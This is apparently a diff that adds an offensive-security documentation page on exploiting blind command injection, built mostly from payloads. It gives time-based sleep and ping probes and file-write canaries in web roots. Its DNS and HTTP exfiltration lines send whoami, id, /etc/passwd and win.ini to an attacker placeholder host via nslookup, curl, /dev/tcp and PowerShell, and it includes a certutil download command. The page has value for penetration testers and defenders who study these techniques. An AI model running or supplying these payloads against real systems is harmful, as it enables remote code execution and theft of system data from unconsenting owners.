@@ -1,0 +1,244 @@
+---
+title: Blind & OOB
+description: Confirming and exploiting command injection when output is suppressed - time-based probes, DNS and HTTP exfiltration, and file-write canaries.
+mitre: [T1190, T1059, T1071.004]
+d3fend: [D3-MH, D3-OTF, D3-NTA]
+impact: [RCE]
+owasp: [A05]
+sidebar:
+  order: 4
+  label: Blind & OOB
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+import Placeholder from '@components/Placeholder.astro';
+
+## TL;DR
+
+No reflected output. Confirm with a measurable side effect: a delay you control, a DNS lookup you receive, an HTTP request you log, or a file you can read elsewhere.
+
+```
+# Time-based confirmation (Linux)
+<original>;sleep 10
+# OOB confirmation (Linux)
+<original>;curl <ATTACKER>/$(id|base64 -w0)
+# Time-based (Windows)
+<original>&ping -n 11 127.0.0.1
+# OOB (Windows PowerShell)
+<original>;iwr <ATTACKER>/$(whoami)
+```
+
+Success indicator: response delayed by your sleep duration; DNS/HTTP hit on your listener with the encoded data in the path.
+
+## When to go blind
+
+You're already past detection. The injection works - you confirmed the request reaches a shell. But:
+
+- The endpoint returns a fixed page regardless of input
+- The original command's output is captured to a log you can't read
+- The application validates output format and rejects anything that doesn't match
+- The shell call is `&`/`>/dev/null`/`fire-and-forget`
+
+Don't fight to make output visible. Switch channels.
+
+## Time-based confirmation
+
+Sleep for a known duration, measure the response time. The differential proves execution.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+;sleep 10                       # 10-second delay
+;ping -c 10 127.0.0.1           # ~10s, alternative if `sleep` blocked
+;perl -e 'sleep 10'             # alternative if `sleep` blocked
+```
+
+Run the request twice - once with `sleep 10`, once with `sleep 0`. A clean ~10-second differential confirms execution. Network jitter can produce 1-3s noise; use 10+ seconds for the first probe to leave headroom.
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+;ping -n 11 127.0.0.1                       # ~10s (10 intervals between 11 pings)
+;Start-Sleep -s 10                          # PowerShell-native
+;timeout /t 10 /nobreak                     # cmd-native
+```
+
+`ping -n` is the most portable - works in cmd and PowerShell, no special privileges.
+
+</TabItem>
+</Tabs>
+
+<Aside type="caution">
+Don't probe with `sleep 60` on a production app. The HTTP request stays open for the duration, holding a worker thread, and may trigger upstream timeout alerts (load balancers, WAFs). Start with 5-10 seconds.
+</Aside>
+
+## Out-of-band exfiltration
+
+OOB beats time-based for exfil because you actually receive *data*, not just a binary signal. Two transports: DNS and HTTP. DNS reaches further (egress firewalls often allow it); HTTP carries more.
+
+### Setting up a listener
+
+Pick one before exploiting:
+
+- **Burp Collaborator** - built into Burp Suite Professional. Generates a unique subdomain per click, logs DNS and HTTP. Best when you already have Burp open.
+- **interactsh** ([projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh)) - open source, self-hostable or use the public server. Run `interactsh-client` and get a hostname; logs print to your terminal.
+- **Your own VPS** - `tcpdump -i any -n udp port 53` for DNS, `python3 -m http.server 80` for HTTP, or `nc -lvnp 80`. Requires a domain pointed at your IP for DNS; an IP address alone works for HTTP.
+
+The placeholder <Placeholder name="ATTACKER" /> below means whichever of these you set up.
+
+### DNS exfiltration
+
+DNS is small (subdomain label limit 63 chars per label, 253 total) but reliable through firewalls.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+Confirmation only:
+
+```bash
+;nslookup <ATTACKER>
+;dig <ATTACKER>
+;host <ATTACKER>
+;getent hosts <ATTACKER>            # if no DNS tools installed
+```
+
+With data:
+
+```bash
+;nslookup $(whoami).<ATTACKER>
+;nslookup $(hostname).<ATTACKER>
+;nslookup $(id|base64 -w0|tr -d '=').<ATTACKER>
+```
+
+Multi-byte data, chunked into labels:
+
+```bash
+;cat /etc/passwd|base64 -w0|tr -d '='|fold -w50|while read c; do nslookup $c.<ATTACKER>; done
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+;nslookup <ATTACKER>
+;Resolve-DnsName <ATTACKER>
+;nslookup "$(whoami).<ATTACKER>"
+;nslookup "$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)))).<ATTACKER>"
+```
+
+Chunked exfil:
+
+```powershell
+;$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\win.ini')) -replace '=','';
+ for($i=0;$i -lt $d.Length;$i+=50){nslookup ($d.Substring($i,[Math]::Min(50,$d.Length-$i))+".<ATTACKER>")}
+```
+
+</TabItem>
+</Tabs>
+
+### HTTP exfiltration
+
+HTTP carries arbitrary data and you receive it as a request body or query string.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+;curl <ATTACKER>                                            # bare ping
+;curl <ATTACKER>/$(whoami)                                  # data in path
+;curl <ATTACKER>/$(id|base64 -w0)
+;curl -X POST <ATTACKER> -d "$(cat /etc/passwd)"            # data in body
+;wget <ATTACKER>/$(whoami) -O /dev/null                     # if no curl
+;curl -F "f=@/etc/passwd" <ATTACKER>                        # multipart upload
+```
+
+If neither curl nor wget is installed:
+
+```bash
+;exec 3<>/dev/tcp/<ATTACKER>/80; echo -e "GET /$(whoami) HTTP/1.0\r\n\r\n" >&3; cat <&3
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+;iwr <ATTACKER>                                                              # bare ping
+;iwr <ATTACKER>/$(whoami)                                                    # data in path
+;iwr <ATTACKER> -Method POST -Body (Get-Content C:\Windows\win.ini -Raw)    # body
+;Invoke-WebRequest <ATTACKER>/$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami))))
+```
+
+cmd.exe equivalent (older Windows, no PowerShell):
+
+```cmd
+&certutil -urlcache -split -f http://<ATTACKER>/x %TEMP%\x
+```
+
+`certutil` runs as a signed Microsoft binary; useful when PowerShell is restricted.
+
+</TabItem>
+</Tabs>
+
+## File-write canary
+
+When neither timing nor outbound traffic is available (egress firewall blocks everything), write a file at a path the application serves.
+
+<Tabs syncKey="os">
+<TabItem label="Linux">
+
+```bash
+;id > /var/www/html/.canary.txt
+;whoami > /var/www/html/uploads/canary.txt 2>&1
+```
+
+Then fetch `<TARGET>/.canary.txt` or `<TARGET>/uploads/canary.txt`. If the file exists with your output, you have RCE plus an exfil channel.
+
+Find the docroot first:
+
+```bash
+;find / -name 'index.php' -o -name 'index.html' 2>/dev/null | head
+;cat /etc/apache2/sites-enabled/*.conf 2>/dev/null | grep -i documentroot
+;cat /etc/nginx/sites-enabled/*.conf 2>/dev/null | grep -i 'root '
+```
+
+</TabItem>
+<TabItem label="Windows">
+
+```powershell
+;whoami | Out-File C:\inetpub\wwwroot\canary.txt
+```
+
+IIS docroot is typically `C:\inetpub\wwwroot\`. Fetch `<TARGET>/canary.txt`.
+
+</TabItem>
+</Tabs>
+
+<Aside type="caution">
+File canaries are persistent evidence. Clean them up before disengaging - `;rm /var/www/html/.canary.txt` (Linux) or `;Remove-Item C:\inetpub\wwwroot\canary.txt` (Windows). Defenders find leftover canaries during forensics and they look exactly like what they are.
+</Aside>
+
+## Conditional / boolean blind
+
+Rare in command injection - most cmdi targets are either reflective or fully blind, with little middle ground. But if the response *length* or *status* changes based on the injected command's success, you can do boolean exfil:
+
+```bash
+;[ $(id -u) -eq 0 ] && sleep 10                 # delay only if root
+;test -f /etc/shadow && sleep 10                # delay only if file readable
+;[ -f /flag.txt ] && sleep 10
+```
+
+This is slow. Prefer OOB whenever an outbound channel exists.
+
+## Common failure modes
+
+- **No delay observed but injection works.** The command runs in a background fork (`&` separator on Linux, async wrapper). Sleep returns to a process the HTTP layer doesn't wait on. Use OOB instead.
+- **DNS lookup fires but you don't see it.** Application uses an internal DNS resolver that doesn't recurse to the public root. Check whether the box can reach the internet at all: `;curl -m 3 https://1.1.1.1`.
+- **HTTP works but DNS doesn't (or vice versa).** Egress firewall is selective. Use whichever channel survives.
+- **Data corrupted in DNS labels.** DNS labels can't contain `+`, `/`, `=` (base64 chars). Strip with `tr -d '+/='` or use base32 (`base32 -w0`) - base32 is DNS-safe.
+- **Shell expansion happens too early.** `nslookup $(id).<ATTACKER>` expands `$(id)` in your local shell before the request goes out. URL-encode or use single quotes: `'nslookup $(id).<ATTACKER>'`.
+- **Response time is noisy.** Cloud autoscaling, WAF inspection, or DB queries on the original endpoint add 1-3s jitter. Use longer sleeps (15-20s) and run baseline measurements first.
+
+## Notes
+
+The hierarchy when output is suppressed: try OOB first (fastest, returns real data), then file canaries (works behind strict egress), then time-based (slowest, lowest signal-to-noise). Time-based is the *confirmation* tool of last resort, not an exfil method - getting a flag byte-by-byte through 10-second probes burns hours and trips IDS thresholds. If you find yourself doing boolean blind on cmdi, double-check there isn't a reflected channel you missed (look at error pages, headers, redirect locations, side-channel endpoints that read the same data).
